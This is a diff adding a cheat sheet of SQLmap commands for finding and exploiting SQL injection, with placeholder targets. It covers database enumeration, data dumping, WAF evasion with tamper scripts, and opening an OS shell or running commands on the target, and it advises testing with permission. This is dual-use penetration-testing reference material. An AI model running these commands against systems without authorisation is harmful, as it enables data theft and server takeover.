@@ -1,0 +1,116 @@
+SQLmap is an automated penetration testing tool designed to detect and exploit SQL injection vulnerabilities in web applications. It supports a wide range of database management systems (DBMS) and can automate the process of identifying vulnerabilities, extracting data, and even gaining access to the underlying operating system.
+Common SQLmap Commands
+Basic Usage
+
+sqlmap -u <URL>
+
+    Tests the target URL for SQL injection vulnerabilities.
+
+Specify HTTP Request Data
+
+    Data Input
+
+sqlmap -u <URL> --data="param1=value1&param2=value2"
+
+    Use when the injection point is in a POST request.
+
+Custom Headers
+
+    sqlmap -u <URL> --headers="User-Agent: custom-agent"
+
+        Adds specific HTTP headers to the request.
+
+Target Parameter
+
+sqlmap -u <URL> -p <parameter>
+
+    Test a specific parameter for SQL injection.
+
+Database Enumeration
+
+    Get Databases
+
+sqlmap -u <URL> --dbs
+
+    Lists all databases available on the target.
+
+Select a Database
+
+    sqlmap -u <URL> -D <database>
+
+        Specify a target database for further exploration.
+
+Extract Data
+
+    Get Tables
+
+sqlmap -u <URL> -D <database> --tables
+
+    Lists all tables in the specified database.
+
+Get Columns
+
+sqlmap -u <URL> -D <database> -T <table> --columns
+
+    Lists all columns in the specified table.
+
+Dump Data
+
+    sqlmap -u <URL> -D <database> -T <table> -C <column1,column2> --dump
+
+        Extracts data from specified columns.
+
+Bypass WAF or Filters
+
+sqlmap -u <URL> --tamper=<tamper_script>
+
+    Use tamper scripts to evade web application firewalls (WAFs).
+
+Authentication
+
+    Cookie-Based
+
+sqlmap -u <URL> --cookie="sessionid=12345"
+
+    Use authenticated cookies to access protected areas.
+
+Auth Credentials
+
+    sqlmap -u <URL> --auth-type=basic --auth-cred=username:password
+
+        Perform basic authentication.
+
+Operating System Access
+
+    OS Shell
+
+sqlmap -u <URL> --os-shell
+
+    Opens a shell on the target server.
+
+Execute Commands
+
+    sqlmap -u <URL> --os-cmd="whoami"
+
+        Executes system commands.
+
+Performance Enhancements
+
+    Threading
+
+sqlmap -u <URL> --threads=10
+
+    Increases the number of threads for faster scanning.
+
+Batch Mode
+
+    sqlmap -u <URL> --batch
+
+        Runs SQLmap without user interaction.
+
+Tips
+
+    Always test responsibly and with permission.
+    Use the --risk and --level options to adjust the depth of testing.
+
+sqlmap -u <URL> --risk=3 --level=5
